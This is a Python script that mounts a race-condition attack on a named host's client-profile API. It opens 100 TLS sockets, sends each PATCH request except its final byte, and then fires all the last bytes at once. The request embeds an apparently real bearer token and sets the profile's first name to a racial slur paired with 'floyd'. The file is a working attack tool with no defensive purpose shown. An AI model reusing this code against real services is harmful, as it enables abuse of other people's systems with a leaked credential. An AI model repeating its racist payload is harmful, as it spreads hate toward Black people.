import asyncio
import json
import socket
import ssl
import time

import uvloop

from aiosocket.aiosocket import AsyncSocket
from aiosocket.http import read_http_response
from aiosocket.ssl import wrap_async_socket, AsyncSSLSocket

HOST = "tosim.sim23.ua"
ADDR = (socket.gethostbyname(HOST), 443)
SSL_CONTEXT = ssl.create_default_context()


def craft_request():
    request_line = (
        "PATCH /api/v1/client/profile HTTP/1.1\r\n"
    )

    data = json.dumps({
        "birthday": "11.07.1997",
        "city": {
            "id": 11,
            "title": "Володимир"
        },
        "first_name": "nigger",
        "gender": None,
        "gender_int": 1,
        "last_name": "floyd"
    })

    content_len = len(data.encode())
    headers = {
        'user-agent': 'Android:11;version:1.12.0;Google sdk_gphone_x86',
        'accept': 'application/json',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE3MzE0NDQ4NjYsImV4cCI6MTczNDA3Mjg2Niwicm9sZXMiOlsiUk9MRV9DTElFTlQiXSwidG9rZW5JZGVudGlmaWVyU3RyaW5nIjoiKzM4MDk1NjQwOTU2N0AxNzMxNDQ0ODY2In0.XiMIIxrAGA0uazS-Qvmz3d9vEuZmxbmEOO6WBpY_XBx2TbnZYt9BrI1KoseRYp0qgoRx29OqpoQkQV7OKMybH2lKShhXQwpq3zdMNsLnzYRxOqPLeGgQJlCFTXUrtwytZlmmiEZ9GnvyEaQdGS7SchMyazu1IMJbG24TfLWYK-kUjYVeAulyWqPSdDT_OQdGXJi6ewTLi7tPbazPGkKdXF-T-X_0JEUauqXYIwI4hMysHiklqZXvYi5l_dWY2qxT6wz4_49t-ONv9Bn-N_CYTyfxWtkP49iqzLXnWw3SvnrYXFipOMbZh6jb-gw0YQWoYS-5Nzj1hVgurFmaRozU0D-AJssotJZF8MU0dAdKgoktgy38rApHJl5ZW6atoTOGM7O7Q2yKY6ClkHuNaGzGKZhYCX4cG7TBjxNRo7Tl_hPBT05Ow5TRhd0vx43TEBxkgasSfFxRMdRP5CaCtFhzbXzyWIAeqtK2h06Na_63dk0wMBA54TO4FpTaDSbSaTimDAyeL2bA4l3rJ9UsoGcvuKECYIfNIHrFGqhS-T9YkOpBwzFATQ8_zGNSuWsE3p643Fj_7CSFLPQhZg1hZy9uH2VhtHVl1wEKypVapjsOnVc22g2U6_7H51SaT2e6x3HCpxCOCZ8Vf5z8Sxu6O-lRVmVT7hWAhCzHHVnVK8gT0nk',
        'content-type': 'application/json',
        'content-length': content_len,
        'host': HOST
    }
    headers = "".join([f"{key.lower()}: {value}\r\n" for key, value in headers.items()])

    request = (request_line + headers + "\r\n" + data).encode("utf-8")
    return request


async def open_socket():
    async_socket = AsyncSocket(socket.AF_INET, socket.SOCK_STREAM)
    await async_socket.connect(ADDR)
    async_ssl_socket = await wrap_async_socket(async_socket, context=SSL_CONTEXT, server_hostname=HOST)
    return async_ssl_socket


async def get_response(sock):
    res = await read_http_response(sock)
    # if res.status_code != 200:
    print(res)
    # return res


async def do_request2(sock):
    req = craft_request()
    req, last_byte = req[:-1], req[-1:]
    sent = await sock.send(req)

    # print(sent)

    async def last_byte_sender():
        await sock.send(last_byte)

    return last_byte_sender


async def main():
    # print(res)
    # sockets = [await open_socket() for i in range(1000)]
    start = time.time()
    sockets = await asyncio.gather(*[open_socket() for _ in range(100)], return_exceptions=True)
    # sockets = [await open_socket() for i in range(200)]
    end = time.time()
    print(end - start)
    start = time.time()
    res = await asyncio.gather(*[do_request2(sock) for sock in sockets if isinstance(sock, AsyncSSLSocket)],
                               return_exceptions=True)
    print(res)
    end = time.time()
    print(end - start)

    start = time.time()
    res = await asyncio.gather(*[send_last_byte() for send_last_byte in res if callable(send_last_byte)],
                               return_exceptions=True)
    end = time.time()
    print(end - start)

    await asyncio.gather(*[get_response(sock) for sock in sockets], return_exceptions=True)

    print(res)


if __name__ == "__main__":
    uvloop.run(main())
